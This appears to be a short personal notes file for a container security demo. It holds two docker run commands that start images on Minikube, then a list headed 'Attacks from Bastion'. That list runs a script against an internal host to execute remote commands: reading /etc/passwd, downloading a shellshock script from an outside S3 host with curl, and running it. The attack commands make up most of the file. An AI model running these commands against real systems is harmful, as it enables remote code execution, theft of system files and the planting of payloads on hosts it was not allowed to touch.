
Commands for Minikube
docker run -p 8082:80 -d --name melon 650143975734.dkr.ecr.ap-southeast-1.amazonaws.com/trendsh-uno-melon
docker run -p 8081:8080 -d --name grapefruit 650143975734.dkr.ecr.ap-southeast-1.amazonaws.com/trendsh-uno-grapefruit


Attacks from Bastion
C:\Python27\python.exe test.py minikube.bryceinternal.com:8081 ls
C:\Python27\python.exe test.py minikube.bryceinternal.com:8081 "cat /etc/passwd"
C:\Python27\python.exe test.py minikube.bryceinternal.com:8081 "curl -o /shellshock.sh https://henry-chan.s3.amazonaws.com/shellshock-config.sh"
C:\Python27\python.exe test.py minikube.bryceinternal.com:8081 "sh /shellshock.sh"